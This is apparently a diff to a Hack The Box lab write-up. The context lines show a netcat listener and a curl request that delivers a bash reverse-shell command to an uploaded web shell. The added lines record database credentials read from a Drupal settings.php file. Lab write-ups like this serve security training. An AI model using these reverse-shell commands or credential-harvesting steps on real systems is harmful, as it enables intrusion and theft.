@@ -125,3 +125,12 @@ root@kali# rlwrap nc -nlvvp 443
 root@kali# curl -G --data-urlencode "c=bash -i >& /dev/tcp/10.10.14.10/443 0>&1" 'http://10.10.10.233/shell.php'
 ```
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/868623ca-76ba-4fd4-bde1-6863c301137f)
+
+`/var/www/html/sites/default/settings.php`
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/b877cd91-e6e5-4406-8100-828b1a80722f)
+
+```shell
+Creds: drupaluser:CQHEy@9M*m23gBVj
+```
+
+
